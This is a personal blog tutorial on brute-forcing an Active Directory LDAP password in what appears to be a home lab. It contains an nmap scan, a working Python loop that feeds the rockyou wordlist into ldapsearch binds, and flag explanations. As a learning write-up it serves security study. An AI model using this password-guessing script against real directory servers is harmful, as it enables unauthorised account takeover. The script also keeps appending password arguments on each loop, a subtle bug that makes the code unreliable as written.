---
title: Brute Forcing Active Directory LDAP using a Custom Python Script
date: 2025-01-26
draft: false
author: Alex Jenkins
---


# Red Team
## Assumptions
1. The username is already known
2. The domain is already known

## Introduction
- tools used (nmap, ldapsearch)
- what is LDAP bind (related to ldapsearch)
- developing a python script

## Reconnaissance
First we need to ensure Lightweight Directory Access Protocol (LDAP) is running. We can do that with a basic nmap scan, performing a full three-way TCP handshake.

```
nmap -sT {host_ip}
```

That command should give you a full list of the running services on the server. Check through the output, you should see LDAP running on port 389. These are my active services with open ports:

```
┌──(alex㉿kali)-[~]
└─$ nmap -sT 192.168.1.138
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-26 12:53 GMT
Nmap scan report for 192.168.1.138
Host is up (0.00034s latency).
Not shown: 989 filtered tcp ports (no-response)
PORT     STATE SERVICE
53/tcp   open  domain
88/tcp   open  kerberos-sec
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
389/tcp  open  ldap
445/tcp  open  microsoft-ds
464/tcp  open  kpasswd5
593/tcp  open  http-rpc-epmap
636/tcp  open  ldapssl
3268/tcp open  globalcatLDAP
3269/tcp open  globalcatLDAPssl
MAC Address: BC:24:11:1E:A3:AE (Unknown)

Nmap done: 1 IP address (1 host up) scanned in 4.36 seconds
```

## Brute Forcing

Python script
```python
import subprocess

password_list = '/usr/share/wordlists/rockyou.txt'
username = 'scarab'
server = '192.168.1.138'

command = ['ldapsearch', 
           '-H', f'ldap://{server}',
           '-D', f'{username}',
           '-b', 'DC=backyard,DC=local',
           ]

with open(password_list) as wordlist:
    
    for password in wordlist:
    
        password = password.strip() # remove whitespace and newlines
        print(f'Trying {password}', end='\r')
        
        command += ['-w', password]
        output = subprocess.run(command, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        
        if output.returncode == 0: # LDAP auth success
            print(f'Matched {password}')
            break
```

Essentially all this python script does is use subprocess to run the ldapsearch tool repeatedly until it finds a password match. It's not super intelligent, if it doesn't find a match it won't tell you - we could modify it to do that but for this exercise this is fine. The script checks for the error code 0, which indicates a successful authentication and prints the matched password. The output is suppressed, but can be added back in by modifying the subprocess.run() function if required.

Now for the command. This is the command that's being run (with all the variables replaced with real values):

``` bash
ldapsearch -H "ldap://192.168.1.138" -D "scarab" -b "DC=backyard,DC=local" -w "abc123"
```

ldapsearch is used to query an LDAP server for directory information. In this case it's being used to validate credentials because any failed logins will return the following error message:

```
ldap_bind: Invalid credentials (49)
```

The command does the following:

| Flag | Description                                                                                                                                            |
| ---- | ------------------------------------------------------------------------------------------------------------------------------------------------------ |
| -H   | Used to specify the LDAP server to connect with. This must be prefixed with *ldap://*, then followed with an IP address or domain name.                |
| -D   | The Distinguished Name (DN) of the user i.e. the username.                                                                                             |
| -w   | The password used to authenticate. Populated using a word-list in the for loop.                                                                        |
| -b   | The **base** Domain Name (DN) from which to begin the search. In this case I've chosen the root domain. Omitting this will result in "no such object". |

And that's it. The weak password policy and lack of lockout mechanisms made this a trivial exercise, allowing limitless attempts to authenticate into the user despite an array of failed logins.

I hope you enjoyed this example of password guessing using LDAP in Active Directory. The purpose of this was to be an introductory exercise using readily available services upon setup of an AD server. This is a trivial example of password guessing, but I feel it has effectively showcased this MITRE technique.

This was new to me and I had fun building the python script and learning a little bit about LDAP and how the ldapsearch tool works. 